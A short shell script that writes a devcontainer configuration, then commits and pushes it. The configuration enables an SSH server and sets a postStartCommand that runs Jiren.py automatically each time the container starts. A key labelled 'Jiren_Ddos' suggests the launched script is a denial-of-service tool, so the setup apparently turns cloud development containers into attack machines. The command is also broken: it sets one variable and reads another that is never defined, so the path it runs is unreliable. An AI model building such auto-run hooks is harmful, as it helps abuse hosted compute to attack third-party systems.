
mkdir -p .devcontainer

cat <<EOL > .devcontainer/devcontainer.json
{
    "amansinghashiya": "Jiren_Ddos",
    "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
    "features": {
        "ghcr.io/devcontainers/features/sshd:1": {
            "version": "latest"
        }
    },
    "postStartCommand": "amansinghashiya=\$(basename \$(git rev-parse --show-toplevel)); python3 /workspaces/\$Jiren_Ddos/Jiren.py",
    "customizations": {
        "vscode": {
            "settings": {
                "python.pythonPath": "/usr/local/bin/python"
            },
            "extensions": [
                "ms-python.python"
            ]
        }
    }
}
EOL

git add .devcontainer/devcontainer.json

git commit -m "Add postStartCommand to run Python script automatically with repo name detection"

git push origin main
